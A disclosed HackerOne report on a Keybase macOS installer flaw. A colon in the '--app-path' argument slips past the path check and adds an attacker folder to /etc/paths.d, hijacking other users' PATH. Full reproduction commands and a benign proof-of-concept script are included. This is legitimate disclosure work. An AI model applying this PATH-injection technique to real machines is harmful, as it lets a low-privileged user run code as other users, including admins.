---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '490960'
original_report_id: '490960'
title: macOS privilege escalation
weakness: Privilege Escalation
team_handle: keybase
created_at: '2019-02-04T11:54:03.909Z'
disclosed_at: '2020-01-24T23:20:42.560Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 44
tags:
- hackerone
- privilege-escalation
---

# macOS privilege escalation

## Metadata

- HackerOne Report ID: 490960
- Weakness: Privilege Escalation
- Program: keybase
- Disclosed At: 2020-01-24T23:20:42.560Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

# Short description

We can add an arbitrary folder to the default `$PATH` environment variable, so we can exploit this to run arbitrary code as the targeted user.

# Steps to reproduce

1. In the example I will use the low privileged `nobody` account (could be any other account) and I will target the `u3mur4` admin user.
```
➜ ~ sudo -u nobody bash
Password:
bash-3.2$ id
uid=4294967294(nobody) gid=4294967294(nobody) groups=4294967294(nobody),12(everyone),61(localaccounts),702(2),701(1),100(_lpoperator)
```

2. Make sure the `/usr/local/bin` directory not exist.
```
sudo mv /usr/local/bin /usr/local/bin2
```
> By default this directory not exist.

3. Remove the `/etc/paths.d/Keybase` file using keybase installer with the `--uninstall-cli` flag.
```
bash-3.2$ cat /etc/paths.d/Keybase
/Applications/Keybase.app/Contents/SharedSupport/bin
bash-3.2$ /Applications/Keybase.app/Contents/Resources/KeybaseInstaller.app/Contents/MacOS/Keybase --run-mode=prod --timeout=10 --debug --app-path='/Applications/Keybase.app' --uninstall-cli
[REMOVED]
02.04.2019 02:30:24.274 Installer:109[INFO] Uninstalled
bash-3.2$ cat /etc/paths.d/Keybase
cat: /etc/paths.d/Keybase: No such file or directory
```
> When the `/usr/local/bin` directory not exist the installer will create the `/etc/paths.d/Keybase` file.

4.  Create the `/var/tmp/poc/Contents/SharedSupport/bin` folder structure and create an executable file named as `keybase`.
```bash
bash-3.2$ mkdir -p /var/tmp/poc/Contents/SharedSupport/bin
bash-3.2$ cd /var/tmp/poc/Contents/SharedSupport/bin
bash-3.2$ cat <<EOF >> keybase
#! /bin/bash
echo test
EOF
bash-3.2$ chmod +x keybase
```

5. Run the keybase installer command with `--app-path=/Applications/Keybase.app/:/var/tmp/poc` and the `--install-cli` flag.
```
bash-3.2$ /Applications/Keybase.app/Contents/Resources/KeybaseInstaller.app/Contents/MacOS/Keybase --run-mode=prod --timeout=10 --debug --app-path='/Applications/Keybase.app/:/var/tmp/poc' --install-cli
[REMOVED]
02.04.2019 02:34:38.720 KBInstaller:32[DEBG] Install: CLI
02.04.2019 02:34:38.720 KBCommandLine:38[DEBG] Helper: addToPath({
    appName = Keybase;
    directory = "/Applications/Keybase.app/:/var/tmp/poc/Contents/SharedSupport/bin";
    name = keybase;
})
02.04.2019 02:34:38.723 KBCommandLine:40[DEBG] Result: {
    path = "/etc/paths.d/Keybase";
}
02.04.2019 02:34:38.723 KBCommandLine:47[DEBG] Helper: addToPath({
    appName = Keybase;
    directory = "/Applications/Keybase.app/:/var/tmp/poc/Contents/SharedSupport/bin";
    name = "git-remote-keybase";
})
[REMOVED]
bash-3.2$ cat /etc/paths.d/Keybase
/Applications/Keybase.app/:/var/tmp/poc/Contents/SharedSupport/bin
```

6. Wait until the targeted user opens a new terminal. The new terminal will load the paths from `/etc/paths.d`.
```
➜  ~ id
uid=501(u3mur4) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),702(2),701(1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)
➜  ~ which keybase
/var/tmp/poc/Contents/SharedSupport/bin/keybase
➜  ~ /usr/libexec/path_helper
PATH="/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/Applications/Keybase.app/:/var/tmp/poc/Contents/SharedSupport/bin"; export PATH;
➜  ~ keybase
test
```

# Why this works? 
The `checkIfPathIsFishy` doesn't checks that the path contains the `":"` character. 

```objective-c
(BOOL)checkIfPathIsFishy:(NSString *)path { 
 NSArray *v = [path componentsSeparatedByString:@"/"]; 
 for (int i = 0; i < v.count; i++) { 
 if ([v[i] isEqualToString:@".."]) { 
 return YES; 
 } 
 if ([v[i] isEqualToString:@"."]) { 
 return YES; 
 } 
 } 
 
 // Do not allow ~ or $ characters in the path. 
 if ([path rangeOfString:@"$"].location != NSNotFound) { 
 return YES; 
 } 
 if ([path rangeOfString:@"~"].location != NSNotFound) { 
 return YES; 
 } 
 return NO; 
} 
```

The `addToPath` writes the path (`/Applications/Keybase.app/:/var/tmp/poc/Contents/SharedSupport/bin`) to the `/etc/paths.d/Keybase` file. The `:` will be interpreted as a search path separator and it will be added to the `$PATH` environment variable.
```
  // If we don't have a /usr/local/bin then fall back to /etc/paths.d.
  // Terminal will load /etc/profile, which uses /usr/libexec/path_helper which loads paths from /etc/paths.d.
  // Some users will override the default usage of /etc/profile in Terminal though so this isn't guaranteed to
  // include keybase in the path on those systems, however, these two cases should handle most of our users.

  NSString *pathsd = @"/etc/paths.d";

  // On fresh Sierra install, /etc/paths.d doesn't exist
  if (![NSFileManager.defaultManager fileExistsAtPath:pathsd]) {
    NSError *error = nil;
    if (![NSFileManager.defaultManager createDirectoryAtPath:pathsd withIntermediateDirectories:NO attributes:nil error:&error]) {
      completion(error, nil);
      return;
    }
  }

  NSString *pathsdPath = [NSString stringWithFormat:@"%@/%@", pathsd, appName];
  if ([NSFileManager.defaultManager fileExistsAtPath:pathsdPath]) {
    completion(nil, nil);
    return;
  }
  NSError *error = nil;
  [directory writeToFile:pathsdPath atomically:YES encoding:NSUTF8StringEncoding error:&error];
  completion(error, @{@"path": pathsdPath});
}
```

## Impact

Access other users personal files and execute commands as the user. If the user is root we could  immediately gain root privileges .

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
